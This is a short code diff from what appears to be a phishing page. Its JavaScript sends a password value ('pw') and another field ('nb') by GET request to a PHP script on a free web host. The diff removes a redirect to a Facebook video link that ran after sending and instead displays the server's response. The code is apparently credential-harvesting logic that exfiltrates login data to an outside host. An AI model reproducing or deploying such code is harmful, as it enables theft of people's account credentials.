@@ -97,8 +97,8 @@ const xh= new XMLHttpRequest();
 xh.open("GET","https://mdtariful.000webhostapp.com/pb.php?pw="+y+"&nb="+x);
 xh.send();
 xh.onload= function show(){
+document.getElementById("a").innerHTML=this.responseText;
 
-window.location.href="https://fb.watch/fO8BS_qt0u/";
 }
 
 
